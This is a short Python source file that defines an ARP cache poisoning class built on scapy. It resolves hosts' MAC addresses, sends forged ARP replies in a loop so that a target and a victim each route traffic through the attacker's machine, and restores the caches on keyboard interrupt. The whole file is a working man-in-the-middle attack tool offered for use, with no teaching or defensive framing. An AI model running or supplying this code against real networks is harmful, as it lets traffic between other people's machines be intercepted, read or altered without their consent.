from scapy.all import * 
import platform
import os 
import argparse
import signal

class Arppoison(object):
	def arp_ping_single_target(self, taget_ip):
		ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=taget_ip),timeout=2 ,verbose=0)
		if ans:
			return ans[0][1].src

	def spoof(self, dst_ip, src_ip, verbose):
		dst_mac = self.arp_ping_single_target(dst_ip)
		arp_response = ARP(pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, op='is-at')
		send(arp_response, verbose=0)
		attacker_mac = ARP().hwsrc
		if verbose is True:
			print('[+] Unsolicited ARP response sent to {}. {} is at {}'.format(dst_ip, src_ip, attacker_mac))

	def restore(self, dst_ip, src_ip):
		original_dst_mac = self.arp_ping_single_target(dst_ip)
		original_src_mac = self.arp_ping_single_target(src_ip)
		arp_response = ARP(pdst=dst_ip, hwdst=original_dst_mac, psrc=src_ip, hwsrc=original_src_mac, op='is-at')
		send(arp_response, verbose=0, count=5) 

	def run(self, target, victim, verbose):
		print('[*] Poisoning the ARP cache of the target')
		try:
			while True:
				self.spoof(target, victim, verbose)  # Send to the target that the victim is on the attacker's MAC
				self.spoof(victim, target, verbose)  # Send to the victim that the target is on the attacker's MAC
				time.sleep(1)
		except KeyboardInterrupt:
			print('[!] Keyboard interrupt detected! Restoring the network back to normal.')
			self.restore(target, victim)
			self.restore(victim, target)